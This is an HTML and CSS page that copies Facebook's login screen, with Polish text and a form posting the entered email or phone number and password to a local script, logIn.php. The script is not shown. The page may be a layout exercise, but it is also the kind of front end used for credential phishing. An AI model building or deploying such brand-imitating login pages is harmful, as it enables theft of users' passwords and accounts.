<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .container {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f0f2f5;
        }

        .information {
            margin-right: 75px;
        }

        .information h1 {
            font-size: 56px;
            color: #0066CC;
        }

        .information h3 {
            font-size: 28px;
            line-height: 140%;
        }

        .information, .login {
            width: 500px;
        }

        input {
            display: block;
            outline: none;
            border: 0px;
            margin-bottom: 18px;
        }

        .emailOrPhoneNumber {
            margin-top: 55px;
        }

        .emailOrPhoneNumber::placeholder {
            overflow: visible;
        }

        .emailOrPhoneNumber, .password {
            padding: 13px 120px 13px 15px;
            border-radius: 7px;
            font-size: 17px;
            border: 1px solid grey;
        }

        .accept {
            padding: 10px 126px 10px 126px;
            border-radius: 7px;
            font-size: 20px;
            font-weight: bold;
            background-color: #0066CC;
            color: #fff;
        }

        .accept:hover {
            cursor: pointer;
        }

        @media screen and (max-width: 1150px) {
            .container {
                flex-direction: column;
            }

            .information {
                margin: 0;
                text-align: center;
            }

            .login {
                display: flex;
                justify-content: center;
            }

            .information, .login {
                width: 100%;
            }

            .emailOrPhoneNumber {
                margin-top: 30px;
            }

            .emailOrPhoneNumber, .password {
                padding: 10px 40px 10px 10px;
            }

            .accept {
                padding: 10px 81.5px 10px 81.5px;
                margin-bottom: 0;
            }
        }

        @media (orientation: landscape) and (max-width: 1150px) {
            .container {
                flex-direction: row;
            }

            .information {
                text-align: center;
            }

            .information {
                width: 50%;
                margin-left: 10px;
                margin-right: 20px;
            }

            .login {
                width: 40%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="information">
            <h1>facebook</h1>
            </br>
            <h3>Facebook pomaga kontaktować się z innymi osobami oraz udostępniać im różne informacje i materiały.</h3>
        </div>

        <div class="login">
            <form action="logIn.php" method="post">
                <input type="text" placeholder="Adres e-mail lub numer telefonu" class="emailOrPhoneNumber" name="emailOrPhoneNumber"/>
                <input type="password" placeholder="Hasło" class="password" name="password"/>
                <input type="submit" value="Zaloguj się" class="accept"/>
            </form>
        </div>
    </div>
</body>
</html>
